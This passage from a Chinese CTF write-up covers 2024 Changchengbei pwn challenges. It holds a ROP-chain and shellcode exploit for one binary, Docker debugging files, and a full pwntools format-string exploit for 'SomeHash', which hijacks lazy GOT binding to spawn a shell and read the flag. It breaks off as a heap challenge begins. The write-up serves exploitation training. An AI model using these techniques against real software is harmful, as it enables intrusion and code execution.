class=\"string\">mov rax, 2</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">mov rdi, 3</span></span><br><span class=\"line\"><span class=\"string\">mov rsi, rsp</span></span><br><span class=\"line\"><span class=\"string\">mov rdx, 0x40</span></span><br><span class=\"line\"><span class=\"string\">mov rax, 0</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">mov rdi, 1</span></span><br><span class=\"line\"><span class=\"string\">mov rsi, rsp</span></span><br><span class=\"line\"><span class=\"string\">mov rdx, 0x40</span></span><br><span class=\"line\"><span class=\"string\">mov rax, 1</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000400655 : call qword ptr [rbp + 0x48]</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">tob = <span class=\"keyword\">lambda</span> x: <span class=\"built_in\">str</span>(x).encode()</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./shutup&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">mov_rax_libc = <span class=\"number\">0x0000400696</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x00000000004007e3</span></span><br><span class=\"line\">get_rax = <span class=\"number\">0x004006B7</span> </span><br><span class=\"line\">call_rax = <span class=\"number\">0x000000000040064e</span></span><br><span class=\"line\">call_ptr_rax = <span class=\"number\">0x00000000004008a3</span></span><br><span class=\"line\">pop_r14_r15 = <span class=\"number\">0x004007E0</span></span><br><span class=\"line\">pop_rbp = <span class=\"number\">0x00000000004005c0</span></span><br><span class=\"line\">pop_rsp_r13_r14_r15 = <span class=\"number\">0x00000000004007dd</span></span><br><span class=\"line\">pop_rbx_rbp_r12_r13_r14_r15  = <span class=\"number\">0x04007DA</span></span><br><span class=\"line\">jmp_rax = <span class=\"number\">0x00000000004005b5</span></span><br><span class=\"line\">pop_r13_r14_r15 = <span class=\"number\">0x0004007DE</span></span><br><span class=\"line\">pop_rsi_r15 = <span class=\"number\">0x00000000004007e1</span></span><br><span class=\"line\">atoi = <span class=\"number\">0x00400550</span></span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x10</span> <span class=\"comment\"># offset 2 syscall</span></span><br><span class=\"line\">base = <span class=\"number\">0x00601380</span></span><br><span class=\"line\">io.sendline(flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0</span>: base + <span class=\"number\">0x38</span>, <span class=\"comment\"># rbp</span></span><br><span class=\"line\">    <span class=\"number\">0x8</span>: pop_rdi, </span><br><span class=\"line\">    <span class=\"number\">0x10</span>: base + <span class=\"number\">0x30</span>,</span><br><span class=\"line\">    <span class=\"number\">0x18</span>: <span class=\"number\">0x00400703</span>, <span class=\"comment\"># call atoi</span></span><br><span class=\"line\">    <span class=\"number\">0x20</span>: pop_r14_r15,</span><br><span class=\"line\">    <span class=\"number\">0x28</span>: <span class=\"string\">b&quot;ls&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">0x30</span>: tob(offset).rjust(<span class=\"number\">7</span>, <span class=\"string\">b&quot; &quot;</span>) + <span class=\"string\">b&quot;\\x00&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">0x38</span>: <span class=\"number\">0x0601060</span>-<span class=\"number\">0x48</span>,</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">pause(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0</span>: tob(<span class=\"number\">0x40000</span>),</span><br><span class=\"line\">    <span class=\"number\">0xf</span>: <span class=\"string\">b&quot;\\x00&quot;</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">make_bytes</span>(<span class=\"params\">addr, bbb</span>):</span><br><span class=\"line\">    target = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(bbb)):</span><br><span class=\"line\">        tmp = bbb[i]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> tmp == <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        template = [</span><br><span class=\"line\">            pop_rbp, <span class=\"number\">4</span> + addr + i,</span><br><span class=\"line\">            pop_rdi, tmp,</span><br><span class=\"line\">            <span class=\"number\">0x0004006BB</span>, base,</span><br><span class=\"line\">        ]</span><br><span class=\"line\">        target.extend(template)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> target</span><br><span class=\"line\"></span><br><span class=\"line\">rop_chain = []</span><br><span class=\"line\"></span><br><span class=\"line\">rop_chain.extend(make_bytes(base + <span class=\"number\">0x40</span>, flat(</span><br><span class=\"line\">    [</span><br><span class=\"line\">        pop_rbx_rbp_r12_r13_r14_r15, <span class=\"number\">0</span>, <span class=\"number\">0</span>, base + <span class=\"number\">0x40</span> + <span class=\"number\">8</span> * <span class=\"number\">8</span>, <span class=\"number\">7</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"number\">0x4007C0</span>, <span class=\"comment\"># mov     rdx, r13</span></span><br><span class=\"line\">        pop_rbp, <span class=\"number\">0x0601060</span>,</span><br><span class=\"line\">        pop_rdi, <span class=\"number\">2</span>,</span><br><span class=\"line\">        get_rax,</span><br><span class=\"line\">        pop_rdi, base &amp; (~<span class=\"number\">0xfff</span>),</span><br><span class=\"line\">        pop_rsi_r15, <span class=\"number\">0x1000</span>, <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"number\">0x000000000040094b</span>, <span class=\"comment\"># jmp ptr[rbp]</span></span><br><span class=\"line\">        base + <span class=\"number\">0xe0</span>,</span><br><span class=\"line\">        shellcode</span><br><span class=\"line\">    ], filler=<span class=\"string\">b&quot;\\x00&quot;</span></span><br><span class=\"line\">)))</span><br><span class=\"line\"></span><br><span class=\"line\">rop_chain.extend(make_bytes(<span class=\"number\">0x00601068</span>, <span class=\"string\">b&quot;7&quot;</span>))</span><br><span class=\"line\">rop_chain.extend(make_bytes(<span class=\"number\">0x00601070</span>, p8(<span class=\"number\">0xa</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0</span>: <span class=\"string\">b&quot;0\\x00&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">0x10</span>: base,</span><br><span class=\"line\">    <span class=\"number\">0x18</span>: rop_chain + [</span><br><span class=\"line\">        pop_rdi, <span class=\"number\">2</span>**<span class=\"number\">32</span>-((<span class=\"number\">0x000601060</span>-<span class=\"number\">0x600fd8</span>)//<span class=\"number\">8</span>), <span class=\"comment\"># read got</span></span><br><span class=\"line\">        get_rax,</span><br><span class=\"line\">        <span class=\"number\">0x0000400715</span>,</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;))</span><br><span class=\"line\"></span><br><span class=\"line\">io.shutdown(<span class=\"string\">&quot;send&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/p/2024changchengbei/image-20240401045219256.png\" alt=\"image-20240401045219256\"></p>\n<p>不同的libc，修改一下上面offset变量即可</p>\n<h2 id=\"附录\"><a href=\"#附录\" class=\"headerlink\" title=\"附录\"></a>附录</h2><p>以下是Ubuntu GLIBC 2.35-0ubuntu3.1的docker调试环境</p>\n<p>Dockerfile</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> ubuntu:<span class=\"number\">22.04</span>@sha256:b492494d8e0113c4ad3fe4528a4b5ff89faa5331f7d52c5c138196f69ce176a6</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> apt update</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> apt install socat -yyq</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> useradd -M -s /bin/false ctf</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"language-bash\"> /app</span></span><br><span class=\"line\"><span class=\"keyword\">COPY</span><span class=\"language-bash\"> your_elf flag /app/</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> <span class=\"built_in\">chmod</span> +x /app/your_elf &amp;&amp; <span class=\"built_in\">chmod</span> -w /app/your_elf &amp;&amp; <span class=\"built_in\">chmod</span> -w /app/flag</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">USER</span> ctf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"language-bash\"> [<span class=\"string\">&quot;socat&quot;</span>, <span class=\"string\">&quot;TCP-LISTEN:9999,reuseaddr,fork&quot;</span>, <span class=\"string\">&quot;EXEC:/app/your_elf&quot;</span>]</span></span><br></pre></td></tr></table></figure>\n\n<p>docker-compose.yml</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">&#x27;3&#x27;</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\">  <span class=\"attr\">pwn-dev:</span></span><br><span class=\"line\">    <span class=\"attr\">build:</span> <span class=\"string\">.</span></span><br><span class=\"line\">    <span class=\"attr\">ports:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;9999:9999&quot;</span></span><br><span class=\"line\">    <span class=\"attr\">privileged:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"attr\">restart:</span> <span class=\"string\">unless-stopped</span></span><br></pre></td></tr></table></figure>\n\n<p>题目zip</p>\n<p><a href=\"https://gitee.com/csomebro/ctftask/tree/master/2024-03_%E9%95%BF%E5%9F%8E%E6%9D%AF\">Csome&#x2F;CTFTask&#x2F;2024-03_长城杯</a></p>\n","excerpt":"","more":"<h2 id=\"SomeHash\"><a href=\"#SomeHash\" class=\"headerlink\" title=\"SomeHash\"></a>SomeHash</h2><p>题目实现了简单的Hash计算的逻辑，提供了3次初始的计算用户输入Hash的机会</p>\n<p>其中漏洞点在</p>\n<p><img src=\"/p/2024changchengbei/image-20240331194408745.png\" alt=\"image-20240331194408745\"></p>\n<p>这里的v10没有检查负数，可以向bss段上方的数据中写入一字节</p>\n<p>这里的利用方法是一个小技巧，来自于got表的lazy函数注册逻辑，也就是checksec显示如下</p>\n<p><img src=\"/p/2024changchengbei/image-20240331194320257.png\" alt=\"image-20240331194320257\"></p>\n<h3 id=\"Lazy函数注册逻辑\"><a href=\"#Lazy函数注册逻辑\" class=\"headerlink\" title=\"Lazy函数注册逻辑\"></a>Lazy函数注册逻辑</h3><p>当ELF加载时，并不会直接调用dl_runtime_resolve将函数注册成真实地址，此时got表也是可写的，我们再观察一下这里got表指向，这里指向的是plt上方的一个地址，可以看到这里的exit函数，got表进入的是0x1030的位置，之后jmp到了0x1020的函数，0x1020函数内会jmp到0x5010的位置，也就是pwndbg中的<code>_dl_runtijme_resolve_xsavec</code></p>\n<p><img src=\"/p/2024changchengbei/image-20240331195253059.png\" alt=\"image-20240331195253059\"></p>\n<p><img src=\"/p/2024changchengbei/image-20240331195144656.png\" alt=\"image-20240331195144656\"></p>\n<p>关于对于<code>dl_runtime_resolve</code>的内容这里就不赘述了，网上有很多教程。这里我们并不需要关心<code>dl_runtime_resolve</code>做了什么，我们只需要动态观察got表未注册的内容的规律，在上面的pwndbg显示的，<strong>注意这里got表是可写的</strong>，那么我们就有一个大胆的猜想，如果我们在函数注册之前，修改了got表里的数据会怎么样？</p>\n<p>可以看到的是，在函数注册前，got表内容十分相近，相差只有一个byte，上述的数组下标溢出的漏洞非常合适这里的利用。</p>\n<h3 id=\"strlen2printf\"><a href=\"#strlen2printf\" class=\"headerlink\" title=\"strlen2printf\"></a>strlen2printf</h3><p>这里有一个非常合适的错误注册的函数——<code>strlen</code></p>\n<p>这里main函数逻辑中，调用strlen是在漏洞利用之后，我们可以修改未注册的strlen的got表内容，改成printf的偏移，使得strlen错误的注册成printf函数，而在接下来的函数调用中，buf内容是可控的，导致我们可以将数组下标溢出漏洞转换成printf格式化字符串漏洞</p>\n<p>（并且，printf的返回值是输出字符的数量，strlen也是字符数量，并不影响后续程序的逻辑）</p>\n<p><img src=\"/p/2024changchengbei/image-20240331200116857.png\" alt=\"image-20240331200116857\"></p>\n<p>至此，我们构造了一个非栈上字符串的格式化字符串漏洞，而这个问题也已经有方法解决<a href=\"https://www.freebuf.com/vuls/284210.html\">https://www.freebuf.com/vuls/284210.html</a></p>\n<h3 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h3><p>完整exp如下，直接使用格式化字符串提权是困难的，因为一共只有4次机会，我们可以利用这四次机会，修改dword_5078地址内容，使得while的次数变多，最后完成格式化字符串攻击</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># io = process(&quot;./somehash&quot;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">tob = <span class=\"keyword\">lambda</span> x: <span class=\"built_in\">str</span>(x).encode()</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;name length&gt; &quot;</span>, tob(-<span class=\"number\">0x98</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0</span>: <span class=\"string\">b&quot;xxx&gt;%6$p-&gt;%19$p-&gt;%21$p-&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">0x80</span>-<span class=\"number\">2</span>: <span class=\"string\">b&quot;a&quot;</span> </span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;name&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;xxx&gt;&quot;</span>)</span><br><span class=\"line\">stack = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">b&quot;-&quot;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;stack : <span class=\"subst\">&#123;stack:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;&gt;&quot;</span>)</span><br><span class=\"line\">libc_leak = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">b&quot;-&quot;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_leak : <span class=\"subst\">&#123;libc_leak:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;&gt;&quot;</span>)</span><br><span class=\"line\">elf_leak = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">b&quot;-&quot;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;elf_leak : <span class=\"subst\">&#123;elf_leak:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf_base = elf_leak - <span class=\"number\">0x258b</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;elf_base : <span class=\"subst\">&#123;elf_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = libc_leak - <span class=\"number\">0x29d90</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">stack_target = stack - <span class=\"number\">0x100</span></span><br><span class=\"line\">payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;stack_target % <span class=\"number\">0x10000</span>&#125;</span>c%23$hn&quot;</span>.encode()</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">target = elf_base + <span class=\"number\">0x05078</span> <span class=\"comment\"># cnt</span></span><br><span class=\"line\">payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;target % <span class=\"number\">0x10000</span>&#125;</span>c%53$hn&quot;</span>.encode()</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;<span class=\"number\">0x100</span> - <span class=\"number\">200</span>&#125;</span>c%21$hn&quot;</span>.encode()</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">stack_target = stack - <span class=\"number\">0x110</span></span><br><span class=\"line\">payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;stack_target % <span class=\"number\">0x10000</span>&#125;</span>c%23$hn&quot;</span>.encode()</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">write = libc_base + <span class=\"number\">0x000000000002a3e5</span> <span class=\"comment\"># pop rdi</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">    target = stack_target + i</span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;target % <span class=\"number\">0x100</span>&#125;</span>c%23$hhn&quot;</span>.encode()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\">    </span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;(write // (<span class=\"number\">0x100</span> ** i)) % (<span class=\"number\">0x100</span>)&#125;</span>c%53$hhn&quot;</span>.encode()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">stack_target = stack - <span class=\"number\">0x110</span> + <span class=\"number\">0x8</span></span><br><span class=\"line\">payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;stack_target % <span class=\"number\">0x10000</span>&#125;</span>c%23$hn&quot;</span>.encode()</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">write = elf_base + <span class=\"number\">0x50c0</span> <span class=\"comment\"># -&gt;&quot;/bin/sh&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">    target = stack_target + i</span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;target % <span class=\"number\">0x100</span>&#125;</span>c%23$hhn&quot;</span>.encode()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\">    </span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;(write // (<span class=\"number\">0x100</span> ** i)) % (<span class=\"number\">0x100</span>)&#125;</span>c%53$hhn&quot;</span>.encode()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">stack_target = stack - <span class=\"number\">0x110</span> + <span class=\"number\">0x10</span></span><br><span class=\"line\">payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;stack_target % <span class=\"number\">0x10000</span>&#125;</span>c%23$hn&quot;</span>.encode()</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">write = libc_base + <span class=\"number\">0x000000000002a3e5</span>+<span class=\"number\">1</span> <span class=\"comment\"># ret</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">    target = stack_target + i</span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;target % <span class=\"number\">0x100</span>&#125;</span>c%23$hhn&quot;</span>.encode()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\">    </span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;(write // (<span class=\"number\">0x100</span> ** i)) % (<span class=\"number\">0x100</span>)&#125;</span>c%53$hhn&quot;</span>.encode()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">stack_target = stack - <span class=\"number\">0x110</span> + <span class=\"number\">0x18</span></span><br><span class=\"line\">payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;stack_target % <span class=\"number\">0x10000</span>&#125;</span>c%23$hn&quot;</span>.encode()</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">write = libc_base + <span class=\"number\">0x50d60</span> <span class=\"comment\"># system</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">    target = stack_target + i</span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;target % <span class=\"number\">0x100</span>&#125;</span>c%23$hhn&quot;</span>.encode()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\">    </span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;(write // (<span class=\"number\">0x100</span> ** i)) % (<span class=\"number\">0x100</span>)&#125;</span>c%53$hhn&quot;</span>.encode()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, <span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, <span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, <span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, <span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pause(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;cat flag&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/p/2024changchengbei/image-20240331201257167.png\" alt=\"image-20240331201257167\"></p>\n<p>ps: 附录中有调试使用的dockerfile与docker-compose.yml</p>\n<h2 id=\"SomeTime\"><a href=\"#SomeTime\" class=\"headerlink\" title=\"SomeTime\"></a>SomeTime</h2><p>本题是单个堆块的堆风水题目，是一个你与some从恶魔手中夺取flag的合作历险故事</p>\n<p>漏洞点在</p>\n<p>SIGALARM的信号处理函数watch中</p>\n<p><img src=\"/p/2024changchengbei/image-20240331201819825.png\" alt=\"image-20240331201819825\"></p>\n<p>这里会将now指针中的低位字节清零，剧情中，some在最后时刻能为你做到最后的事情。\t</p>\n<p>信号注册在init函数中</p>\n<p>思路也比较简单只需要利用tcachebin机制，<strong>把tcachebin当作以前pwn可以保存多个堆块的题目的堆块数组即可</strong></p>\n<p>为了做到上述内容，我们要保证每次申请释放的size大小不同，即可在tcachebin中只存在一个堆块</p>\n<p>由于我们可以将申请出来的指针做低字节的修改，所以我们可以很方便的构造堆叠，修改tcachebin的size位使得size变大，扩大溢出范围，之后我们可以通过重复申请tcachebin内容的堆块，泄露地址，最后完成fd修改，最后houseofapple一把梭</p>\n<h3 id=\"关于堆风水\"><a href=\"#关于堆风水\" class=\"headerlink\" 